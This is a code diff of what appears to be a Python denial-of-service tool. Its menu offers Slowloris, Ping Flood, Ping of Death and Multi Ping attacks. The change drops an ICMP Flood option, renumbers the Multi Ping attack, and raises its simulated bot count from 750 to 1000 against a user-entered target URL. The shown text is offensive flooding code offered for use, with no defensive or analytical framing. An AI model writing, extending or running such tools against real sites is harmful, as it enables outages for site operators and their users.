@@ -292,8 +292,7 @@ def X():
 |2| Slowloris Ping Attack   | Only in admin |
 |3| Ping Flood Attack       |               |
 |4| Ping of Death Attack    |               |
-|5| ICMP Flood Attack       |               |
-|6| Multi Ping Attack       |               |
+|5| Multi Ping Attack       |               |
         '''
             print(F"{list}")
             op = input("Select option: ")
@@ -317,13 +316,9 @@ def X():
                 Pingofdeath()
                 input(f'Press Enter to continue...')
 
-            if op == '5':
-                Icmpflood()
-                input(f'Press Enter to continue...')
-
-            if op == '6': 
+            if op == '5': 
                     ping_count = 100
-                    num_bots = 750
+                    num_bots = 1000
                     website = input(f'Enter an http url: ')
                     def send_ping():
                         for _ in range(ping_count):
